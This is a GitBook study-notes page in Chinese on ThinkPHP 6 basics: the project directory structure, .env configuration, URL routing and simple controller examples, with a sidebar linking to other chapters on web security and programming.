
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>thinkphp · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="thinkphp面试题.html" />
    
    
    <link rel="prev" href="../interview/golang.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    前言
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../tips.html">
            
                <a href="../tips.html">
            
                    
                    tips
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../language/python.html">
            
                <a href="../language/python.html">
            
                    
                    python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../interview/python.html">
            
                <a href="../interview/python.html">
            
                    
                    python后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../language/python_secure.html">
            
                <a href="../language/python_secure.html">
            
                    
                    python安全
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../interview/python_secure.html">
            
                <a href="../interview/python_secure.html">
            
                    
                    python安全面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../language/java.html">
            
                <a href="../language/java.html">
            
                    
                    java
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../language/javagui.html">
            
                <a href="../language/javagui.html">
            
                    
                    java swing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.2" data-path="../language/javafx.html">
            
                <a href="../language/javafx.html">
            
                    
                    javafx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3" data-path="../interview/java.html">
            
                <a href="../interview/java.html">
            
                    
                    JAVA后端开发面试题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.4" data-path="../language/s2.html">
            
                <a href="../language/s2.html">
            
                    
                    s2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="../language/golang.html">
            
                <a href="../language/golang.html">
            
                    
                    golang
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../interview/golang.html">
            
                <a href="../interview/golang.html">
            
                    
                    golang后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter active" data-level="2.5" data-path="thinkphp6.html">
            
                <a href="thinkphp6.html">
            
                    
                    thinkphp
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.5.1" data-path="thinkphp面试题.html">
            
                <a href="thinkphp面试题.html">
            
                    
                    thinkphp框架面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.6" data-path="yii2.html">
            
                <a href="yii2.html">
            
                    
                    yii2
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.7" data-path="../c#/c">
            
                <span>
            
                    
                    c#
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.7.1" data-path="../.net/.net面试题.html">
            
                <a href="../.net/.net面试题.html">
            
                    
                    .NET面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.8" data-path="../language/c++.html">
            
                <a href="../language/c++.html">
            
                    
                    c++
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.8.1" data-path="../language/c++面试题.html">
            
                <a href="../language/c++面试题.html">
            
                    
                    c++面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.9" data-path="../android/base.html">
            
                <a href="../android/base.html">
            
                    
                    安卓开发
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../language/algorithm.html">
            
                <a href="../language/algorithm.html">
            
                    
                    算法基础
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../web/sql injection.html">
            
                <a href="../web/sql injection.html">
            
                    
                    sql注入
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../web/xss.html">
            
                <a href="../web/xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../web/xxe.html">
            
                <a href="../web/xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../neiwang/privilege.html">
            
                <a href="../neiwang/privilege.html">
            
                    
                    权限提升
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2" data-path="../neiwang/information.html">
            
                <a href="../neiwang/information.html">
            
                    
                    横向移动，代理隧道
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.3" >
            
                <span>
            
                    
                    [权限维持]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.3.1" data-path="pentest.html">
            
                <a href="pentest.html">
            
                    
                    渗透面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../reverse/pe.html">
            
                <a href="../reverse/pe.html">
            
                    
                    PE文件结构
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../base/huibian2.html">
            
                <a href="../base/huibian2.html">
            
                    
                    汇编
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../reverse/win32.html">
            
                <a href="../reverse/win32.html">
            
                    
                    win32
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../reverse/mfc.html">
            
                <a href="../reverse/mfc.html">
            
                    
                    MFC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../reverse/保护模式.html">
            
                <a href="../reverse/保护模式.html">
            
                    
                    保护模式
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.5.1" >
            
                <span>
            
                    
                    逆向基础面试题
            
                </span>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="../neiwang/antikill.html">
            
                <a href="../neiwang/antikill.html">
            
                    
                    免杀
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="../neiwang/antikillinter.html">
            
                <a href="../neiwang/antikillinter.html">
            
                    
                    反病毒/免杀面试题
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >thinkphp</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h2 id="&#x57FA;&#x7840;">&#x57FA;&#x7840;</h2>
<h3 id="&#x5355;&#x5E94;&#x7528;&#x6A21;&#x5F0F;">&#x5355;&#x5E94;&#x7528;&#x6A21;&#x5F0F;</h3>
<pre><code>www  WEB&#x90E8;&#x7F72;&#x76EE;&#x5F55;&#xFF08;&#x6216;&#x8005;&#x5B50;&#x76EE;&#x5F55;&#xFF09;
&#x251C;&#x2500;app           &#x5E94;&#x7528;&#x76EE;&#x5F55;
&#x2502;  &#x251C;&#x2500;controller      &#x63A7;&#x5236;&#x5668;&#x76EE;&#x5F55;
&#x2502;  &#x251C;&#x2500;model           &#x6A21;&#x578B;&#x76EE;&#x5F55;
&#x2502;  &#x251C;&#x2500; ...            &#x66F4;&#x591A;&#x7C7B;&#x5E93;&#x76EE;&#x5F55;
&#x2502;  &#x2502;
&#x2502;  &#x251C;&#x2500;common.php         &#x516C;&#x5171;&#x51FD;&#x6570;&#x6587;&#x4EF6;
&#x2502;  &#x2514;&#x2500;event.php          &#x4E8B;&#x4EF6;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;
&#x2502;
&#x251C;&#x2500;config                &#x914D;&#x7F6E;&#x76EE;&#x5F55;
&#x2502;  &#x251C;&#x2500;app.php            &#x5E94;&#x7528;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;cache.php          &#x7F13;&#x5B58;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;console.php        &#x63A7;&#x5236;&#x53F0;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;cookie.php         Cookie&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;database.php       &#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;filesystem.php     &#x6587;&#x4EF6;&#x78C1;&#x76D8;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;lang.php           &#x591A;&#x8BED;&#x8A00;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;log.php            &#x65E5;&#x5FD7;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;middleware.php     &#x4E2D;&#x95F4;&#x4EF6;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;route.php          URL&#x548C;&#x8DEF;&#x7531;&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;session.php        Session&#x914D;&#x7F6E;
&#x2502;  &#x251C;&#x2500;trace.php          Trace&#x914D;&#x7F6E;
&#x2502;  &#x2514;&#x2500;view.php           &#x89C6;&#x56FE;&#x914D;&#x7F6E;
&#x2502;
&#x251C;&#x2500;view            &#x89C6;&#x56FE;&#x76EE;&#x5F55;
&#x251C;&#x2500;route                 &#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x76EE;&#x5F55;
&#x2502;  &#x251C;&#x2500;route.php          &#x8DEF;&#x7531;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;
&#x2502;  &#x2514;&#x2500; ...   
&#x2502;
&#x251C;&#x2500;public                WEB&#x76EE;&#x5F55;&#xFF08;&#x5BF9;&#x5916;&#x8BBF;&#x95EE;&#x76EE;&#x5F55;&#xFF09;
&#x2502;  &#x251C;&#x2500;index.php          &#x5165;&#x53E3;&#x6587;&#x4EF6;
&#x2502;  &#x251C;&#x2500;router.php         &#x5FEB;&#x901F;&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;
&#x2502;  &#x2514;&#x2500;.htaccess          &#x7528;&#x4E8E;apache&#x7684;&#x91CD;&#x5199;
&#x2502;
&#x251C;&#x2500;extend                &#x6269;&#x5C55;&#x7C7B;&#x5E93;&#x76EE;&#x5F55;
&#x251C;&#x2500;runtime               &#x5E94;&#x7528;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x76EE;&#x5F55;&#xFF08;&#x53EF;&#x5199;&#xFF0C;&#x53EF;&#x5B9A;&#x5236;&#xFF09;
&#x251C;&#x2500;vendor                Composer&#x7C7B;&#x5E93;&#x76EE;&#x5F55;
&#x251C;&#x2500;.example.env          &#x73AF;&#x5883;&#x53D8;&#x91CF;&#x793A;&#x4F8B;&#x6587;&#x4EF6;
&#x251C;&#x2500;composer.json         composer &#x5B9A;&#x4E49;&#x6587;&#x4EF6;
&#x251C;&#x2500;LICENSE.txt           &#x6388;&#x6743;&#x8BF4;&#x660E;&#x6587;&#x4EF6;
&#x251C;&#x2500;README.md             README &#x6587;&#x4EF6;
&#x251C;&#x2500;think                 &#x547D;&#x4EE4;&#x884C;&#x5165;&#x53E3;&#x6587;&#x4EF6;
</code></pre><p>&#x5728;&#x5B9E;&#x9645;&#x7684;&#x90E8;&#x7F72;&#x4E2D;&#xFF0C;&#x8BF7;&#x786E;&#x4FDD;&#x53EA;&#x6709;<code>public</code>&#x76EE;&#x5F55;&#x53EF;&#x4EE5;&#x5BF9;&#x5916;&#x8BBF;&#x95EE;&#x3002;</p>
<p>&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x540E;&#xFF0C;<code>app</code>&#x76EE;&#x5F55;&#x4E0B;&#x4F1A;&#x5305;&#x542B;&#x4E0B;&#x9762;&#x7684;&#x6587;&#x4EF6;&#x3002;</p>
<pre><code>&#x251C;&#x2500;app           &#x5E94;&#x7528;&#x76EE;&#x5F55;
&#x2502;  &#x2502;
&#x2502;  &#x251C;&#x2500;BaseController.php    &#x9ED8;&#x8BA4;&#x57FA;&#x7840;&#x63A7;&#x5236;&#x5668;&#x7C7B;
&#x2502;  &#x251C;&#x2500;ExceptionHandle.php   &#x5E94;&#x7528;&#x5F02;&#x5E38;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;
&#x2502;  &#x251C;&#x2500;common.php            &#x5168;&#x5C40;&#x516C;&#x5171;&#x51FD;&#x6570;&#x6587;&#x4EF6;
&#x2502;  &#x251C;&#x2500;middleware.php        &#x5168;&#x5C40;&#x4E2D;&#x95F4;&#x4EF6;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;
&#x2502;  &#x251C;&#x2500;provider.php          &#x670D;&#x52A1;&#x63D0;&#x4F9B;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;
&#x2502;  &#x251C;&#x2500;Request.php           &#x5E94;&#x7528;&#x8BF7;&#x6C42;&#x5BF9;&#x8C61;
&#x2502;  &#x2514;&#x2500;event.php             &#x5168;&#x5C40;&#x4E8B;&#x4EF6;&#x5B9A;&#x4E49;&#x6587;&#x4EF6;
</code></pre><h3 id="&#x5F00;&#x542F;&#x8C03;&#x8BD5;">&#x5F00;&#x542F;&#x8C03;&#x8BD5;</h3>
<h4 id="&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x5B9A;&#x4E49;">&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x5B9A;&#x4E49;</h4>
<p>&#x53EF;&#x4EE5;&#x5728;&#x5E94;&#x7528;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;<code>.env</code>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x6587;&#x4EF6;&#xFF0C;&#x7528;&#x4E8E;&#x5728;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#x6A21;&#x62DF;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#xFF08;&#x8BE5;&#x6587;&#x4EF6;&#x5EFA;&#x8BAE;&#x5728;&#x670D;&#x52A1;&#x5668;&#x90E8;&#x7F72;&#x7684;&#x65F6;&#x5019;&#x5FFD;&#x7565;&#xFF09;&#xFF0C;<code>.env</code>&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#x5B9A;&#x4E49;&#x683C;&#x5F0F;&#x91C7;&#x7528;<code>ini</code>&#x65B9;&#x5F0F;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>APP_DEBUG =  true
</code></pre><blockquote>
<p>&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x540E;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x6709;&#x4E00;&#x4E2A;<code>.example.env</code>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x793A;&#x4F8B;&#x6587;&#x4EF6;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6539;&#x6210;<code>.env</code>&#x6587;&#x4EF6;&#x540E;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x3002;</p>
<p>&#x5982;&#x679C;&#x4F60;&#x7684;&#x90E8;&#x7F72;&#x73AF;&#x5883;&#x5355;&#x72EC;&#x914D;&#x7F6E;&#x4E86;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF08; &#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x524D;&#x7F00;&#x4F7F;&#x7528;<code>PHP_</code>&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x8BF7;&#x5220;&#x9664;<code>.env</code>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x907F;&#x514D;&#x51B2;&#x7A81;&#x3002;</p>
</blockquote>
<p>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x7684;&#x53C2;&#x6570;&#x4F1A;&#x5168;&#x90E8;&#x8F6C;&#x6362;&#x4E3A;&#x5927;&#x5199;&#xFF0C;&#x503C;&#x4E3A; <code>off</code>&#xFF0C;<code>no</code> &#x548C; <code>false</code> &#x7B49;&#x6548;&#x4E8E; &#x5E03;&#x5C14;&#x503C;<code>false</code>&#xFF0C;&#x503C;&#x4E3A; <code>yes</code> &#x3001;<code>on</code>&#x548C; <code>true</code> &#x7B49;&#x6548;&#x4E8E; &#x5E03;&#x5C14;&#x503C;&#x7684;<code>true</code>&#x3002;</p>
<p>&#x5982;&#x679C;&#x60F3;&#x5728;&#x4E3B;&#x63A7;&#x5236;&#x5668;&#x4E2D;&#x521B;&#x5EFA;&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#xFF0C;&#x5219;</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">config</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> Env::get(<span class="hljs-string">&apos;DATABASE.DATABASE&apos;</span>);
    }
</code></pre>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/99ea6171f5662d30114a7ca036d5d07b.png" alt="99ea6171f5662d30114a7ca036d5d07b.png"></p>
<pre><code>&#x5373;&#x8C03;&#x53D6;ENV&#x4E0B;&#x7684;
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/a1aab116826cd86bb878bcd52aa9af72.png" alt="a1aab116826cd86bb878bcd52aa9af72.png"></p>
<pre><code class="lang-php">&#x540C;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x50CF;&#x8C03;&#x7528;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">config</span><span class="hljs-params">()</span>
    </span>{
<span class="hljs-comment">//        return Env::get(&apos;DATABASE.DATABASE&apos;);</span>
        <span class="hljs-keyword">return</span> config::get(<span class="hljs-string">&apos;database.connections.mysql.hostname&apos;</span>);
    }
</code></pre>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/00a4dd74ad128e000ca9d0f3a048a61a.png" alt="00a4dd74ad128e000ca9d0f3a048a61a.png"></p>
<p>.env&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x9AD8;&#x4E0E;config&#x4E0B;&#x7684;</p>
<h3 id="url&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;">URL&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;</h3>
<p><strong>&#x914D;&#x7F6E;&#x6587;&#x4EF6; config/route.php&#x4E2D;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x4FEE;&#x6539;controller&#x7684;&#x63A7;&#x5236;&#x5668;&#x7684;&#x76EE;&#x5F55;&#x540D;&#xFF0C;&#x6240;&#x4EE5;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x9700;&#x8981;&#x5148;&#x627E;&#x5230;app&#x4E0B;&#x7684;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;</strong></p>
<p>PHP&#x4E0D;&#x5EFA;&#x8BAE;&#x7528;die&#xFF0C;exit&#x7B49;&#x4E2D;&#x65AD;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;halt()&#x52A9;&#x624B;&#x51FD;&#x6570;</p>
<p>halt(&quot;&#x4E2D;&#x65AD;&#x8F93;&#x51FA;&quot;);</p>
<p><code>6.0</code>&#x7684;URL&#x8BBF;&#x95EE;&#x53D7;&#x8DEF;&#x7531;&#x5F71;&#x54CD;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x6216;&#x5339;&#x914D;&#x8DEF;&#x7531;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF08;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x5F00;&#x542F;&#x5F3A;&#x5236;&#x8DEF;&#x7531;&#x6A21;&#x5F0F;&#x7684;&#x8BDD;&#xFF09;&#xFF0C;&#x5219;&#x662F;&#x57FA;&#x4E8E;&#xFF1A;</p>
<pre><code>http://serverName/index.php&#xFF08;&#x6216;&#x8005;&#x5176;&#x5B83;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#xFF09;/&#x63A7;&#x5236;&#x5668;/&#x64CD;&#x4F5C;/&#x53C2;&#x6570;/&#x503C;&#x2026;
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/4d90e6e7aecd2a6481bf9f14d47057f9.png" alt="4d90e6e7aecd2a6481bf9f14d47057f9.png"></p>
<pre><code>&#x5982;&#x56FE;&#xFF0C;index.php&#x5C31;&#x662F;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#xFF0C;test&#x662F;&#x63A7;&#x5236;&#x5668;&#xFF0C;hello&#x662F;&#x63A7;&#x5236;&#x5668;&#x5185;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;value&#x662F;&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x540D;&#xFF0C;&#x800C;123&#x5C31;&#x662F;&#x53C2;&#x6570;&#x503C;
</code></pre><p>&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x5982;&#x4E0B;&#x662F;public&#x4E0B;&#x7684;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/ede82bbd83d8b128aed66f642fc1ab94.png" alt="ede82bbd83d8b128aed66f642fc1ab94.png"></p>
<h3 id="&#x63A7;&#x5236;&#x5668;&#x5B9A;&#x4E49;">&#x63A7;&#x5236;&#x5668;&#x5B9A;&#x4E49;</h3>
<p>&#x63A7;&#x5236;&#x5668;&#x6587;&#x4EF6;&#x901A;&#x5E38;&#x653E;&#x5728;<code>controller</code>&#x4E0B;&#x9762;&#xFF0C;&#x7C7B;&#x540D;&#x548C;&#x6587;&#x4EF6;&#x540D;&#x4FDD;&#x6301;&#x5927;&#x5C0F;&#x5199;&#x4E00;&#x81F4;&#xFF0C;&#x5E76;&#x91C7;&#x7528;&#x9A7C;&#x5CF0;&#x547D;&#x540D;&#xFF08;&#x9996;&#x5B57;&#x6BCD;&#x5927;&#x5199;&#xFF09;&#x3002;</p>
<p>&#x5982;&#x679C;&#x8981;&#x6539;&#x53D8;<code>controller</code>&#x76EE;&#x5F55;&#x540D;&#xFF0C;&#x9700;&#x8981;&#x5728;<code>route.php</code>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;&#xFF1A;</p>
<pre><code>&apos;controller_layer&apos;    =&gt;    &apos;controllers&apos;,
</code></pre><p>&#x5982;&#x679C;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x5355;&#x5E94;&#x7528;&#x6A21;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;&#x63A7;&#x5236;&#x5668;&#x7684;&#x7C7B;&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

class User 
{
    public function login()
    {
        return &apos;login&apos;;
    }
}
</code></pre><p>&#x63A7;&#x5236;&#x5668;&#x7C7B;&#x6587;&#x4EF6;&#x7684;&#x5B9E;&#x9645;&#x4F4D;&#x7F6E;&#x5219;&#x53D8;&#x6210;</p>
<pre><code>app\controller\User.php
</code></pre><p>&#x8BBF;&#x95EE;URL&#x5730;&#x5740;&#x662F;&#xFF08;&#x5047;&#x8BBE;&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF09;</p>
<pre><code>http://localhost/user/login
</code></pre><p>&#x5982;&#x679C;&#x4F60;&#x7684;&#x63A7;&#x5236;&#x5668;&#x662F;<code>HelloWorld</code>&#xFF0C;&#x5E76;&#x4E14;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

class HelloWorld 
{
    public function hello()
    {
        return &apos;hello&#xFF0C;world&#xFF01;&apos;;
    }
}
</code></pre><p>&#x63A7;&#x5236;&#x5668;&#x7C7B;&#x6587;&#x4EF6;&#x7684;&#x5B9E;&#x9645;&#x4F4D;&#x7F6E;&#x662F;</p>
<pre><code>app\controller\HelloWorld.php
</code></pre><p>&#x8BBF;&#x95EE;URL&#x5730;&#x5740;&#x662F;&#xFF08;&#x5047;&#x8BBE;&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF09;</p>
<pre><code>http://localhost/index.php/HelloWorld/hello
</code></pre><p>&#x5E76;&#x4E14;&#x4E5F;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x4E0B;&#x9762;&#x7684;&#x8BBF;&#x95EE;URL</p>
<pre><code>http://localhost/hello_world/hello
</code></pre><p><img src="https://s1.imagehub.cc/images/2023/01/27/03725db63e20037cba3c81cb7ed443e4.png" alt="03725db63e20037cba3c81cb7ed443e4.png"></p>
<h3 id="&#x57FA;&#x7840;&#x7A7A;&#x591A;&#x7EA7;&#x63A7;&#x5236;&#x5668;">&#x57FA;&#x7840;.&#x7A7A;.&#x591A;&#x7EA7;&#x63A7;&#x5236;&#x5668;</h3>
<p>&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x5EFA;&#x8BAE;&#x7ED9;&#x4F60;&#x7684;&#x63A7;&#x5236;&#x5668;&#x7EE7;&#x627F;&#x4E00;&#x4E2A;&#x57FA;&#x7840;&#x63A7;&#x5236;&#x5668;&#x3002;</p>
<p>&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x540E;&#xFF0C;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;<code>app\BaseController</code>&#x57FA;&#x7840;&#x63A7;&#x5236;&#x5668;&#x7C7B;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5BF9;&#x8BE5;&#x57FA;&#x7840;&#x63A7;&#x5236;&#x5668;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x3002;</p>
<p>&#x8BE5;&#x57FA;&#x7840;&#x63A7;&#x5236;&#x5668;&#x4EC5;&#x4EC5;&#x63D0;&#x4F9B;&#x4E86;&#x63A7;&#x5236;&#x5668;&#x9A8C;&#x8BC1;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x6CE8;&#x5165;&#x4E86;<code>think\App</code>&#x548C;<code>think\Request</code>&#x5BF9;&#x8C61;&#xFF0C;&#x56E0;&#x6B64;&#x4F60;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x63A7;&#x5236;&#x5668;&#x4E2D;&#x4F7F;&#x7528;<code>app</code>&#x548C;<code>request</code>&#x5C5E;&#x6027;&#x8C03;&#x7528;<code>think\App</code>&#x548C;<code>think\Request</code>&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF1A;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/07eabb0103f31a797b8c112d955bb558.png" alt="07eabb0103f31a797b8c112d955bb558.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/13a0bd29dcc09e93071c4028438a3076.png" alt="13a0bd29dcc09e93071c4028438a3076.png"></p>
<p>&#x7A7A;&#x63A7;&#x5236;&#x5668;</p>
